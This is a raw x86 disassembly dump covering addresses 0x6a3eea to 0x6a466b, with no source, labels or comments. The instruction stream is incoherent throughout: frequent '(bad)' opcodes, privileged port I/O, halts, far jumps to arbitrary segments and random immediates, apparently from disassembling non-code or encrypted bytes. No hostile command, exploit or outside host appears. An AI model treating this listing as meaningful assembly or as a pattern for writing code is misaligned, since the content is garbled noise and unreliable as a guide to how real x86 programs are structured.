  6a3eea:	out    0x76,eax
  6a3eec:	clc    
  6a3eed:	jne    0x6a3f33
  6a3eef:	repnz mov bh,0xb0
  6a3ef2:	add    edx,DWORD PTR [ecx-0x36]
  6a3ef5:	mov    bl,0x2
  6a3ef7:	call   0x6465:0xa8684f3e
  6a3efe:	aam    0xfc
  6a3f00:	shr    BYTE PTR [ebx-0x169a5da1],cl
  6a3f06:	outs   dx,DWORD PTR ds:[esi]
  6a3f07:	xchg   DWORD PTR [ecx+0x14],ebx
  6a3f0a:	test   al,0x52
  6a3f0c:	shl    eax,1
  6a3f0e:	push   ebx
  6a3f0f:	in     al,0xde
  6a3f11:	add    dh,cl
  6a3f13:	pop    ebx
  6a3f14:	leave  
  6a3f15:	push   edi
  6a3f16:	dec    ebp
  6a3f17:	sub    eax,0x2ca73ebf
  6a3f1c:	jno    0x6a3f2b
  6a3f1e:	sbb    al,0x5a
  6a3f20:	sub    al,0x1e
  6a3f22:	xor    bl,BYTE PTR ss:[ebp-0x27ae47b4]
  6a3f29:	loop   0x6a3f47
  6a3f2b:	test   ebp,edx
  6a3f2d:	rol    DWORD PTR [eax],1
  6a3f2f:	hlt    
  6a3f30:	adc    bl,BYTE PTR [edx-0x4f8fe2f9]
  6a3f36:	and    dl,0x9d
  6a3f39:	fisub  WORD PTR [ebx-0x5d]
  6a3f3c:	fld    TBYTE PTR [ebx+esi*8-0x4a]
  6a3f40:	shl    DWORD PTR [edx-0x672c377d],cl
  6a3f46:	xor    ebx,DWORD PTR [esi-0x4b32f9bc]
  6a3f4c:	fcom   QWORD PTR [edi]
  6a3f4e:	xchg   ecx,ebx
  6a3f50:	jge    0x6a3ef4
  6a3f52:	jb     0x6a3eed
  6a3f54:	ss into 
  6a3f56:	mov    cl,BYTE PTR [edx-0x683abad3]
  6a3f5c:	sub    edi,DWORD PTR [eax]
  6a3f5e:	xor    esp,eax
  6a3f60:	jl     0x6a3fb9
  6a3f62:	leave  
  6a3f63:	aaa    
  6a3f64:	xchg   cl,ah
  6a3f66:	add    al,0xb1
  6a3f68:	popf   
  6a3f69:	aad    0x5f
  6a3f6b:	jae    0x6a3f7a
  6a3f6d:	stc    
  6a3f6e:	xchg   BYTE PTR [ecx+0x765afdc1],bh
  6a3f74:	sti    
  6a3f75:	sub    eax,0x53c1d01
  6a3f7a:	jmp    0xa94cf60c
  6a3f7f:	aam    0x18
  6a3f81:	mov    eax,ds:0xc519c107
  6a3f86:	sub    BYTE PTR [ebx],al
  6a3f88:	dec    esi
  6a3f89:	pop    es
  6a3f8a:	mov    ebx,0xb8f7d98a
  6a3f8f:	leave  
  6a3f90:	push   ecx
  6a3f91:	(bad)  
  6a3f92:	jmp    0x6a3f5e
  6a3f94:	adc    ch,BYTE PTR [ecx+ebp*4+0x15]
  6a3f98:	sahf   
  6a3f99:	mov    edi,DWORD PTR [eax+eax*1+0x76]
  6a3f9d:	or     eax,0x541012f0
  6a3fa2:	(bad)  
  6a3fa3:	and    al,ah
  6a3fa5:	cli    
  6a3fa6:	cmp    eax,0x837986d0
  6a3fab:	cmp    al,0x4a
  6a3fad:	add    ecx,DWORD PTR [edi-0x54]
  6a3fb0:	gs pop esi
  6a3fb2:	cwde   
  6a3fb3:	loope  0x6a3fb5
  6a3fb5:	add    al,0x69
  6a3fb7:	xchg   ecx,eax
  6a3fb8:	dec    ebx
  6a3fb9:	popa   
  6a3fba:	std    
  6a3fbb:	mov    al,ds:0xe54b6c57
  6a3fc0:	lds    ebp,FWORD PTR [edi+0x27]
  6a3fc3:	jg     0x6a3f56
  6a3fc5:	cli    
  6a3fc6:	and    ch,BYTE PTR [esi]
  6a3fc8:	push   ds
  6a3fc9:	sub    ebp,eax
  6a3fcb:	push   ss
  6a3fcc:	sbb    BYTE PTR [esi+0x7781f99d],dl
  6a3fd2:	xchg   ebx,eax
  6a3fd3:	sub    bh,bl
  6a3fd5:	xchg   ebx,eax
  6a3fd6:	or     al,0x75
  6a3fd8:	mov    es,esp
  6a3fda:	sbb    eax,0xdcb07d4e
  6a3fdf:	push   ds
  6a3fe0:	fld    TBYTE PTR [eax-0x7b5658c5]
  6a3fe6:	mov    WORD PTR [esi-0x5c],ds
  6a3fe9:	push   edi
  6a3fea:	xor    DWORD PTR [esi],esi
  6a3fec:	adc    dl,BYTE PTR ds:0x7c47a51d
  6a3ff2:	(bad)  
  6a3ff3:	mov    ebx,0xd11edb0
  6a3ff8:	test   ah,ch
  6a3ffa:	out    dx,eax
  6a3ffb:	xor    eax,DWORD PTR [eax-0x4931a062]
  6a4001:	mov    ch,0xdf
  6a4003:	shl    BYTE PTR ds:0xb10f72c3,0xc3
  6a400a:	sbb    edi,edi
  6a400c:	loop   0x6a402c
  6a400e:	add    al,0x59
  6a4010:	mov    BYTE PTR [ecx-0x5e19c54b],bh
  6a4016:	sub    eax,0x83042136
  6a401b:	jmp    0x93445412
  6a4020:	scas   eax,DWORD PTR es:[edi]
  6a4021:	mov    ah,0xb3
  6a4023:	dec    edx
  6a4024:	mov    esp,0x9024b9cb
  6a4029:	loopne 0x6a4090
  6a402b:	or     BYTE PTR [eax+0x6],0x23
  6a402f:	xchg   edx,eax
  6a4030:	pop    esp
  6a4031:	fdivr  st(2),st
  6a4033:	cmp    eax,0x2a4f91f8
  6a4038:	push   ebp
  6a4039:	mov    DWORD PTR [edx],ecx
  6a403b:	(bad)  
  6a403c:	dec    esp
  6a403d:	std    
  6a403e:	ss loope 0x6a40a6
  6a4041:	outs   dx,DWORD PTR ds:[esi]
  6a4042:	pop    ebp
  6a4043:	out    dx,al
  6a4044:	lods   eax,DWORD PTR ds:[esi]
  6a4045:	add    DWORD PTR [edx+0x52a8a453],0x4d
  6a404c:	mov    bh,0xe4
  6a404e:	mov    ch,0x6e
  6a4050:	das    
  6a4051:	inc    edx
  6a4052:	mov    al,ds:0x122f7e51
  6a4057:	cmp    al,0xd9
  6a4059:	mov    DWORD PTR [eax+0x24bc6e1],esi
  6a405f:	retf   0x626d
  6a4062:	xchg   ecx,esp
  6a4064:	push   esp
  6a4065:	pushf  
  6a4066:	shr    DWORD PTR [eax+0x70],0x83
  6a406a:	stos   BYTE PTR es:[edi],al
  6a406b:	mov    ds:0x6eea7e1d,al
  6a4070:	mov    ecx,0x21c1526c
  6a4075:	mov    WORD PTR [ebx+0x624319a5],fs
  6a407b:	mov    WORD PTR [edx-0x2d9ee0c3],fs
  6a4081:	inc    edx
  6a4082:	pusha  
  6a4083:	lea    edx,[ebp-0x6c]
  6a4086:	pop    ebp
  6a4087:	jmp    0x7099:0x5314d005
  6a408e:	mov    WORD PTR [esi],es
  6a4090:	ret    0x47dd
  6a4093:	aad    0x70
  6a4095:	inc    ecx
  6a4096:	or     eax,0x4d3e5ca0
  6a409b:	imul   edi,ebp,0x2a
  6a409e:	pusha  
  6a409f:	mov    edi,0xcad5ff22
  6a40a4:	test   al,bh
  6a40a6:	add    al,0x57
  6a40a8:	jge    0x6a40ef
  6a40aa:	dec    esi
  6a40ab:	xchg   ebp,eax
  6a40ac:	imul   ecx,DWORD PTR [edi+edx*8-0x5],0xffffffb5
  6a40b1:	xor    esi,edi
  6a40b3:	sub    BYTE PTR [esi-0x5b],al
  6a40b6:	push   es
  6a40b7:	jbe    0x6a40f0
  6a40b9:	cmc    
  6a40ba:	call   0x82c5:0x59b0ba15
  6a40c1:	(bad)  
  6a40c2:	pusha  
  6a40c3:	loope  0x6a4053
  6a40c5:	jb     0x6a4087
  6a40c7:	inc    eax
  6a40c8:	std    
  6a40c9:	mov    edx,0xa57e1ae8
  6a40ce:	test   al,0xd1
  6a40d0:	into   
  6a40d1:	jmp    0xb8c3:0x34b2b608
  6a40d8:	mov    es,ebx
  6a40da:	fs jle 0x6a40f2
  6a40dd:	aaa    
  6a40de:	mov    edx,0xda4a7ae1
  6a40e3:	mov    ebx,0x5e9a8b5e
  6a40e8:	aaa    
  6a40e9:	das    
  6a40ea:	(bad)  
  6a40eb:	cmp    BYTE PTR [edi],bh
  6a40ed:	in     al,dx
  6a40ee:	xchg   edi,eax
  6a40ef:	sbb    ebx,esp
  6a40f1:	test   al,0xbf
  6a40f3:	ins    BYTE PTR es:[edi],dx
  6a40f4:	mov    ah,0xb1
  6a40f6:	mov    al,0x73
  6a40f8:	xchg   esi,eax
  6a40f9:	mov    ebx,0xe62acc01
  6a40fe:	mov    cs,WORD PTR [eax]
  6a4100:	sub    BYTE PTR [ebx],dl
  6a4102:	add    bl,0x3d
  6a4105:	add    ecx,DWORD PTR ds:0x3d4d1f0f
  6a410b:	lods   al,BYTE PTR ds:[esi]
  6a410c:	xchg   ecx,eax
  6a410d:	cld    
  6a410e:	stos   DWORD PTR es:[edi],eax
  6a410f:	mov    eax,0xdb314858
  6a4114:	dec    eax
  6a4115:	in     eax,dx
  6a4116:	(bad)  [edi+0x1b]
  6a4119:	fidiv  DWORD PTR [eax]
  6a411b:	push   0x49d1922f
  6a4120:	aam    0x8b
  6a4122:	stc    
  6a4123:	cmp    al,0x53
  6a4125:	out    0xe7,al
  6a4127:	test   eax,0xabb9d357
  6a412c:	mov    DWORD PTR [edx],eax
  6a412e:	and    BYTE PTR [ebx],dh
  6a4130:	sar    DWORD PTR [edx+0x4d],1
  6a4133:	sbb    ch,bh
  6a4135:	iret   
  6a4136:	aaa    
  6a4137:	call   0x493b:0x61b88ddc
  6a413e:	mov    ah,BYTE PTR fs:[ebx-0x6b]
  6a4142:	add    ebp,DWORD PTR [ebx-0x15]
  6a4145:	inc    eax
  6a4146:	retf   
  6a4147:	ins    DWORD PTR es:[edi],dx
  6a4148:	xchg   dl,ch
  6a414a:	(bad)  
  6a414b:	sub    DWORD PTR [ecx-0x4ec5e48c],ebp
  6a4151:	aaa    
  6a4152:	xchg   ebp,eax
  6a4153:	push   eax
  6a4154:	mov    ch,0xfe
  6a4156:	or     eax,0x7be344d7
  6a415b:	shl    DWORD PTR [ebx],cl
  6a415d:	add    DWORD PTR [eax],edi
  6a415f:	retf   0x4407
  6a4162:	mov    edi,0x70accd1
  6a4167:	test   eax,0xe6da8323
  6a416c:	sub    al,0xfd
  6a416e:	inc    eax
  6a416f:	mov    ebp,0x12e01e85
  6a4174:	into   
  6a4175:	not    DWORD PTR [edi+0x58]
  6a4178:	(bad)  
  6a4179:	cmp    al,0x84
  6a417b:	xlat   BYTE PTR ds:[ebx]
  6a417c:	data16 ror BYTE PTR [ebp+0x231c7035],cl
  6a4183:	inc    ebx
  6a4184:	adc    al,0xc6
  6a4186:	add    bl,BYTE PTR [ebx-0x12]
  6a4189:	(bad)
  6a418e:	cwde   
  6a418f:	jb     0x6a411c
  6a4191:	outs   dx,BYTE PTR ds:[esi]
  6a4192:	xor    cl,al
  6a4194:	out    0x77,eax
  6a4196:	push   edx
  6a4197:	xchg   esp,eax
  6a4198:	ss iret 
  6a419a:	xor    DWORD PTR [esi],edx
  6a419c:	(bad)
  6a419f:	es add eax,0x56b290df
  6a41a5:	adc    eax,0xfce25e4b
  6a41aa:	cld    
  6a41ab:	and    al,0xac
  6a41ad:	cli    
  6a41ae:	ret    
  6a41af:	(bad)  [ebp+0x109ff2e4]
  6a41b5:	sub    al,0x8d
  6a41b7:	sub    al,BYTE PTR [esp+ebp*4+0x6d4b747c]
  6a41be:	and    edx,DWORD PTR [ecx-0x6e]
  6a41c1:	jmp    0x814aa533
  6a41c6:	lea    edi,[ebx+0x6af1ee3e]
  6a41cc:	fisttp WORD PTR [ebx-0x79]
  6a41cf:	or     eax,0x6c811411
  6a41d4:	ss out dx,al
  6a41d6:	sub    eax,0x34e7b3dc
  6a41db:	cs add BYTE PTR es:[ebx-0x66],bl
  6a41e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a41e1:	sbb    bh,BYTE PTR [ebp-0x17]
  6a41e4:	and    ecx,esi
  6a41e6:	cs mov ebp,0x8b543ea7
  6a41ec:	dec    edi
  6a41ed:	pop    ds
  6a41ee:	jg     0x6a41c6
  6a41f0:	mov    ebx,0xbf8cb3cd
  6a41f5:	mov    edi,0x388b2c30
  6a41fa:	mov    bh,0x99
  6a41fc:	add    edi,ecx
  6a41fe:	xor    BYTE PTR [eax],dh
  6a4200:	push   eax
  6a4201:	and    bh,BYTE PTR [ecx-0x5a]
  6a4204:	cmp    al,0xae
  6a4206:	loope  0x6a4250
  6a4208:	dec    ebp
  6a4209:	int3   
  6a420a:	adc    al,0x11
  6a420c:	inc    edx
  6a420d:	test   BYTE PTR [edi+esi*4-0x11],dh
  6a4211:	mov    ebx,0x82765913
  6a4216:	jg     0x6a41f5
  6a4218:	adc    esp,DWORD PTR [ebp-0x527a83dd]
  6a421e:	repz adc eax,0x6c93c82a
  6a4224:	shr    BYTE PTR [edi],1
  6a4226:	xor    al,0x11
  6a4228:	(bad)  
  6a4229:	dec    eax
  6a422a:	and    eax,0x79396ca2
  6a422f:	ins    DWORD PTR es:[edi],dx
  6a4230:	push   esp
  6a4231:	xchg   ebx,eax
  6a4233:	rol    DWORD PTR [ebp-0x48c00898],1
  6a4239:	xchg   edx,eax
  6a423a:	mov    edi,0xf6043b
  6a423f:	or     BYTE PTR [esi+0xeed0331],0xfb
  6a4246:	pop    ecx
  6a4247:	(bad)  
  6a4248:	jmp    0x7d73:0x38bbbbc8
  6a424f:	adc    BYTE PTR [esi+eiz*1],0xcb
  6a4253:	(bad)  
  6a4254:	mov    ebp,0x13e73ece
  6a4259:	mov    al,0x37
  6a425b:	pop    esi
  6a425c:	aad    0xbe
  6a425e:	ror    BYTE PTR [edi-0x501f4eb3],1
  6a4264:	aaa    
  6a4265:	cmp    BYTE PTR [edx+0x78b7798c],bh
  6a426b:	and    BYTE PTR [ebp-0x1f],0xe7
  6a426f:	ret    
  6a4270:	push   esp
  6a4271:	dec    ebx
  6a4272:	popf   
  6a4273:	bound  esi,QWORD PTR [edi-0x6e9fd62]
  6a4279:	inc    esi
  6a427a:	xor    eax,0xef5cf0ba
  6a427f:	jnp    0x6a42be
  6a4281:	xor    al,BYTE PTR [ecx-0x11]
  6a4284:	arpl   WORD PTR [ebp+ebx*4+0x7594d90c],cx
  6a428b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a428c:	cmp    eax,ecx
  6a428e:	das    
  6a428f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a4290:	xor    BYTE PTR [ecx-0x5c848a85],dh
  6a4296:	push   cs
  6a4297:	lock and BYTE PTR [ebp-0x76199eb6],0x5f
  6a429f:	sub    ah,ah
  6a42a1:	mov    dh,0x7
  6a42a3:	jnp    0x6a431e
  6a42a5:	outs   dx,BYTE PTR ds:[esi]
  6a42a6:	(bad)  
  6a42a8:	push   ss
  6a42a9:	sub    bh,bh
  6a42ab:	fisubr WORD PTR [ebp-0x1e]
  6a42ae:	fs push eax
  6a42b0:	inc    esp
  6a42b1:	aas    
  6a42b2:	(bad)  
  6a42b4:	rcl    DWORD PTR [edx-0x19c81ff5],cl
  6a42ba:	jae    0x6a42a4
  6a42bc:	push   cs
  6a42bd:	test   al,0x61
  6a42bf:	pop    edi
  6a42c0:	dec    esp
  6a42c1:	pop    eax
  6a42c2:	mov    dl,0xc4
  6a42c4:	(bad)
  6a42c8:	clc    
  6a42c9:	in     eax,0x7f
  6a42cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a42cc:	jp     0x6a434d
  6a42ce:	add    eax,0xf6182b6a
  6a42d3:	inc    edi
  6a42d4:	jne    0x6a4274
  6a42d6:	and    DWORD PTR [eax+0x74c71436],esp
  6a42dc:	ficom  DWORD PTR [eax]
  6a42de:	aaa    
  6a42df:	jne    0x6a431b
  6a42e1:	test   BYTE PTR [ecx-0x68f1cdc2],bh
  6a42e7:	cli    
  6a42e8:	shl    DWORD PTR [edi+0x4410b54],1
  6a42ee:	dec    esi
  6a42ef:	push   ds
  6a42f0:	(bad)  
  6a42f1:	mov    ?,WORD PTR [edi+0x4a]
  6a42f4:	jp     0x6a42e1
  6a42f6:	add    bl,ah
  6a42f8:	cld    
  6a42f9:	dec    ebp
  6a42fa:	push   ss
  6a42fb:	dec    ebx
  6a42fc:	test   al,0xd
  6a42fe:	shl    al,1
  6a4300:	sbb    al,dh
  6a4302:	pop    edx
  6a4303:	pop    ds
  6a4304:	push   edi
  6a4305:	add    DWORD PTR [edi+ebx*8+0x7e],esp
  6a4309:	adc    edi,DWORD PTR [esi]
  6a430b:	pop    edx
  6a430c:	test   al,0xa2
  6a430e:	pop    ds
  6a430f:	jecxz  0x6a4345
  6a4311:	(bad)  
  6a4312:	push   eax
  6a4313:	dec    ebx
  6a4314:	ins    BYTE PTR es:[edi],dx
  6a4315:	jle    0x6a42c4
  6a4317:	sub    eax,0x412f9885
  6a431c:	icebp  
  6a431d:	loop   0x6a439c
  6a431f:	imul   edi,DWORD PTR [esi-0x5c],0x303a09cd
  6a4326:	jmp    0xb46ac509
  6a432b:	xchg   DWORD PTR [ebx+ebp*1],edi
  6a432e:	or     al,0x8c
  6a4330:	mov    ds:0x2385b3ef,al
  6a4335:	mov    ?,edi
  6a4337:	enter  0x9b82,0x2b
  6a433b:	jge    0x6a438c
  6a433d:	pop    ds
  6a433e:	sub    al,0x56
  6a4340:	pusha  
  6a4341:	sbb    al,0x31
  6a4343:	aaa    
  6a4344:	push   ebp
  6a4345:	mov    edi,0xb1b9e081
  6a434a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a434b:	pop    ds
  6a434c:	(bad)  
  6a434d:	cmp    DWORD PTR [ecx+0x7b],ebx
  6a4350:	inc    ecx
  6a4351:	sahf   
  6a4352:	xor    eax,0xb3d875b9
  6a4357:	daa    
  6a4358:	sbb    DWORD PTR [ebp+0x242b0920],ecx
  6a435e:	mov    ebx,0x3118761e
  6a4363:	ja     0x6a43b6
  6a4365:	inc    esi
  6a4366:	out    dx,al
  6a4367:	push   ecx
  6a4368:	out    0x90,eax
  6a436a:	push   esi
  6a436b:	dec    esp
  6a436c:	stos   BYTE PTR es:[edi],al
  6a436d:	cmp    eax,0x8667b1b1
  6a4372:	scas   eax,DWORD PTR es:[edi]
  6a4373:	fwait
  6a4374:	shl    BYTE PTR [edi-0x193d94cc],cl
  6a437a:	in     al,dx
  6a437b:	ror    DWORD PTR [edx+0x56],0x96
  6a437f:	cwde   
  6a4380:	inc    edi
  6a4381:	(bad)  
  6a4382:	jge    0x6a4339
  6a4384:	push   esp
  6a4385:	xlat   BYTE PTR ds:[ebx]
  6a4386:	mov    bh,0xce
  6a4388:	push   es
  6a4389:	mov    bh,0x8a
  6a438b:	mov    al,ds:0xb717f360
  6a4390:	inc    edi
  6a4391:	out    dx,al
  6a4392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a4393:	pop    esi
  6a4394:	add    al,0x16
  6a4396:	in     eax,dx
  6a4397:	fsub   QWORD PTR [edi-0x20]
  6a439a:	pop    ebx
  6a439b:	in     al,0x8c
  6a439d:	test   BYTE PTR [edx+0x134fb9ff],dh
  6a43a3:	bound  ecx,QWORD PTR ds:0x54b3cdc9
  6a43a9:	ds sub al,0x4e
  6a43ac:	ret    
  6a43ad:	jns    0x6a43b1
  6a43af:	inc    ebp
  6a43b0:	stc    
  6a43b1:	(bad)  
  6a43b2:	repz mov edi,0xd7abc044
  6a43b8:	sbb    eax,0x6d5dcfb5
  6a43bd:	inc    ebp
  6a43be:	je     0x6a442b
  6a43c0:	or     ah,bh
  6a43c2:	pop    esi
  6a43c3:	push   es
  6a43c4:	mov    eax,ds:0x992d5926
  6a43c9:	std    
  6a43ca:	mov    cl,0xa6
  6a43cc:	fadd   DWORD PTR [eax+0x73730663]
  6a43d2:	push   ecx
  6a43d3:	pop    esi
  6a43d4:	lea    esp,[ecx+edx*4+0x4f]
  6a43d8:	mov    ebx,0xdc58ce83
  6a43dd:	lock out 0xb1,al
  6a43e0:	push   ds
  6a43e1:	fwait
  6a43e2:	mov    ah,0x1d
  6a43e4:	lods   eax,DWORD PTR ds:[esi]
  6a43e5:	jns    0x6a4378
  6a43e7:	int3   
  6a43e8:	pop    ebx
  6a43e9:	js     0x6a444e
  6a43eb:	cmp    esi,ebp
  6a43ed:	out    0x69,eax
  6a43ef:	xchg   ebp,eax
  6a43f0:	aad    0x65
  6a43f2:	arpl   WORD PTR [esi+0x55],si
  6a43f5:	ror    bh,1
  6a43f7:	adc    edi,DWORD PTR [esi+ebp*1+0x92be02]
  6a43fe:	xor    al,0xcb
  6a4400:	cld    
  6a4401:	bound  edx,QWORD PTR [edx+0x75]
  6a4404:	fnsave [esi+0x1a]
  6a4407:	mov    ah,0x1b
  6a4409:	je     0x6a4479
  6a440b:	fisubr DWORD PTR [ebx]
  6a440d:	mov    ds:0xc6eef31e,al
  6a4412:	rcr    BYTE PTR [esi+0x4595e2d8],cl
  6a4418:	pop    ecx
  6a4419:	ret    
  6a441a:	mov    eax,ds:0xeeac8cc
  6a441f:	pop    ecx
  6a4420:	and    esi,edi
  6a4422:	fdiv   st(2),st
  6a4424:	repz call 0x47ef929b
  6a442a:	in     eax,0x74
  6a442c:	add    BYTE PTR [ecx-0x2],cl
  6a442f:	pusha  
  6a4430:	push   edi
  6a4431:	outs   dx,BYTE PTR ds:[esi]
  6a4432:	mov    eax,ds:0x7c4afdc
  6a4437:	and    DWORD PTR [edx-0x9d19120],edi
  6a443d:	out    0x1a,al
  6a443f:	xlat   BYTE PTR ds:[ebx]
  6a4440:	push   es
  6a4441:	(bad)  
  6a4442:	int    0x16
  6a4444:	push   ecx
  6a4445:	jecxz  0x6a4453
  6a4447:	dec    edx
  6a4448:	icebp  
  6a4449:	int    0x68
  6a444b:	bound  esi,QWORD PTR [esi+0x33]
  6a444e:	mov    al,0x54
  6a4450:	cmp    esi,ebp
  6a4452:	cmp    eax,DWORD PTR [ebx]
  6a4454:	push   ds
  6a4455:	dec    ecx
  6a4456:	cdq    
  6a4457:	test   DWORD PTR [edx-0x4eb7ff60],ebp
  6a445d:	jno    0x6a43f7
  6a445f:	daa    
  6a4460:	sub    eax,0xf15c3dc9
  6a4465:	mov    cl,0xe6
  6a4467:	hlt    
  6a4468:	fisubr WORD PTR [ebp-0x24]
  6a446b:	test   ecx,esi
  6a446d:	call   0x879dcaec
  6a4472:	js     0x6a4417
  6a4474:	jns    0x6a4487
  6a4476:	outs   dx,DWORD PTR ds:[esi]
  6a4477:	xchg   edx,eax
  6a4478:	icebp  
  6a4479:	call   0x3292279
  6a447e:	cmp    dl,al
  6a4480:	pop    edi
  6a4481:	js     0x6a44f1
  6a4483:	int    0xd7
  6a4485:	xchg   ebp,eax
  6a4486:	jns    0x6a44b2
  6a4488:	mov    cl,dh
  6a448a:	jecxz  0x6a448b
  6a448c:	cmp    al,dh
  6a448e:	pusha  
  6a448f:	jecxz  0x6a4496
  6a4491:	fs mov dl,0x50
  6a4494:	sub    DWORD PTR [edx],edi
  6a4496:	mov    ds:0xe10e549f,al
  6a449b:	pop    edi
  6a449c:	pop    ss
  6a449d:	and    BYTE PTR [edx],dh
  6a449f:	adc    al,0xce
  6a44a1:	mov    WORD PTR [ebp+0x7c7cd94c],es
  6a44a7:	retf   
  6a44a8:	sub    DWORD PTR [ebp-0x3f44b983],esi
  6a44ae:	(bad)  
  6a44b0:	add    eax,0x3ec08616
  6a44b5:	enter  0xdfe3,0xc5
  6a44b9:	xchg   cl,cl
  6a44bb:	gs sbb eax,0x70d28697
  6a44c1:	out    dx,eax
  6a44c2:	test   DWORD PTR ds:[esi],0x9da3840c
  6a44c9:	inc    esi
  6a44ca:	mov    es:0xce61cf7a,eax
  6a44d0:	cs xor al,0xcf
  6a44d3:	xchg   BYTE PTR [edi],dh
  6a44d5:	retf   
  6a44d6:	fidiv  WORD PTR [ebx]
  6a44d8:	or     BYTE PTR [ebx+0x3ec0e1a],cl
  6a44de:	cmc    
  6a44df:	mov    ah,0x44
  6a44e1:	pusha  
  6a44e2:	adc    al,0x55
  6a44e4:	jle    0x6a4539
  6a44e6:	scas   eax,DWORD PTR es:[edi]
  6a44e7:	ret    
  6a44e8:	fwait
  6a44e9:	popf   
  6a44ea:	adc    esi,edx
  6a44ec:	(bad)  
  6a44ed:	scas   al,BYTE PTR es:[edi]
  6a44ee:	sbb    al,0x88
  6a44f0:	mov    al,ds:0xefb7b0b
  6a44f5:	retf   0xcd0b
  6a44f8:	mov    esi,0x6d788149
  6a44fd:	ret    0xa4f0
  6a4500:	mov    ds:0xa90e4c4f,al
  6a4505:	rcr    bh,1
  6a4507:	cwde   
  6a4508:	rol    DWORD PTR [edx],0xb9
  6a450b:	jecxz  0x6a4586
  6a450d:	inc    ecx
  6a450e:	lds    esp,FWORD PTR [ebx-0x2]
  6a4511:	ret    
  6a4512:	cmp    al,0xc6
  6a4514:	fwait
  6a4515:	mov    dl,0x75
  6a4517:	jno    0x6a4560
  6a4519:	dec    ecx
  6a451a:	sbb    bl,BYTE PTR [ebp+0x42]
  6a451d:	repnz xchg ebp,eax
  6a451f:	mov    ch,al
  6a4521:	ret    0xb698
  6a4524:	push   0xc684628a
  6a4529:	pop    edx
  6a452a:	adc    eax,0x39185b15
  6a452f:	out    dx,eax
  6a4530:	int    0x30
  6a4532:	iret   
  6a4533:	sbb    cl,al
  6a4535:	or     DWORD PTR [edx+0x10],0x49f21842
  6a453c:	add    al,0xe6
  6a453e:	popa   
  6a453f:	xor    BYTE PTR [ebx-0xe64ffad],bl
  6a4545:	xor    eax,0xa2a0c135
  6a454a:	les    ecx,FWORD PTR [ecx+0x49]
  6a454d:	jecxz  0x6a453b
  6a454f:	cmp    ch,BYTE PTR [edi+0x201947ca]
  6a4555:	repz mov ebx,0xb32ca00b
  6a455b:	adc    esp,DWORD PTR [ebx+0x7c]
  6a455e:	pushf  
  6a455f:	sbb    dl,bh
  6a4561:	adc    eax,DWORD PTR [ebp+0x2a]
  6a4564:	jno    0x6a44ed
  6a4566:	push   esi
  6a4567:	icebp  
  6a4568:	xor    ebx,ebx
  6a456a:	or     dh,BYTE PTR [edi+0x48]
  6a456d:	inc    ebp
  6a456e:	mov    ecx,0x7e8523f8
  6a4573:	adc    ebp,edi
  6a4575:	add    al,0xf2
  6a4577:	dec    ebp
  6a4578:	adc    DWORD PTR [eax+0x7b],esp
  6a457b:	sub    al,0x9
  6a457d:	imul   esi,DWORD PTR [esi],0x3b
  6a4580:	pusha  
  6a4581:	jmp    0x3de58053
  6a4586:	retf   0xaa04
  6a4589:	push   ecx
  6a458a:	xlat   BYTE PTR ds:[ebx]
  6a458b:	xchg   esp,eax
  6a458c:	cld    
  6a458d:	or     eax,0xf04b3cc6
  6a4592:	mov    esi,0x166f3255
  6a4597:	push   ebp
  6a4598:	add    dh,BYTE PTR [esi-0x23e6714f]
  6a459e:	mov    esi,DWORD PTR [esi+0x6856d655]
  6a45a4:	mov    eax,ds:0xb702b946
  6a45a9:	mov    esi,0x94a15714
  6a45ae:	ret    0xf794
  6a45b1:	repz cmp al,0x7
  6a45b4:	repz frstor [ecx]
  6a45b7:	lahf   
  6a45b8:	adc    DWORD PTR [eax+eiz*1-0x3b957033],ebx
  6a45bf:	idiv   DWORD PTR [ecx+0x43]
  6a45c2:	imul   esi,edx,0xd1567fa8
  6a45c8:	ret    
  6a45c9:	push   ebx
  6a45ca:	mov    ds:0xe96681f6,eax
  6a45cf:	jmp    0x6a45dc
  6a45d1:	fld    QWORD PTR [esi]
  6a45d3:	(bad)  
  6a45d4:	in     al,0xd8
  6a45d6:	or     edx,edx
  6a45d8:	aad    0x6d
  6a45da:	inc    ebp
  6a45db:	sar    ah,1
  6a45dd:	(bad)  
  6a45de:	dec    ebp
  6a45e0:	adc    edx,DWORD PTR [di+0x727a]
  6a45e5:	xchg   ecx,eax
  6a45e6:	xchg   esp,eax
  6a45e7:	clc    
  6a45e8:	cdq    
  6a45e9:	mov    al,ds:0x1e650ef0
  6a45ee:	popa   
  6a45ef:	retf   0x51e7
  6a45f2:	loopne 0x6a459e
  6a45f4:	rcl    BYTE PTR [ebp+0x2ea59cfd],1
  6a45fa:	add    dl,BYTE PTR [ebx-0x437ff453]
  6a4600:	ins    BYTE PTR es:[edi],dx
  6a4601:	xchg   BYTE PTR [ebp-0x61],cl
  6a4604:	jmp    0xbf5:0xc1bd52a4
  6a460b:	jmp    0xa5b16c60
  6a4610:	icebp  
  6a4611:	add    BYTE PTR [ecx-0x18],bh
  6a4614:	or     ch,BYTE PTR [edx+0xe463254]
  6a461a:	cli    
  6a461b:	push   ss
  6a461c:	pop    esp
  6a461d:	mov    eax,ds:0xe7ef9ef3
  6a4622:	ins    DWORD PTR es:[edi],dx
  6a4623:	leave  
  6a4624:	fist   WORD PTR [ecx+esi*4+0x7]
  6a4628:	mov    esi,0x449ce071
  6a462d:	jp     0x6a45e6
  6a462f:	push   es
  6a4630:	sub    esp,DWORD PTR [edi+0x574122d0]
  6a4636:	sbb    eax,0xdd23f831
  6a463b:	(bad)  
  6a463d:	xor    DWORD PTR [eax],0x39
  6a4640:	outs   dx,BYTE PTR ds:[esi]
  6a4641:	outs   dx,BYTE PTR ds:[esi]
  6a4642:	adc    BYTE PTR [edi-0x7fc7a736],al
  6a4648:	mov    cs,WORD PTR [ebx+0x3b]
  6a464b:	mov    al,0xb9
  6a464d:	xchg   BYTE PTR [edi-0x2e],cl
  6a4650:	xchg   ebx,eax
  6a4651:	daa    
  6a4652:	sbb    ecx,DWORD PTR [eax-0x1b]
  6a4655:	xor    ecx,DWORD PTR [esi-0x55a66f84]
  6a465b:	call   0x7e156ceb
  6a4660:	jecxz  0x6a464d
  6a4662:	or     al,0x54
  6a4664:	and    esi,DWORD PTR [edx+0x1c5ee933]
  6a466a:	xchg   ebp,eax
  6a466b:	dec    edx
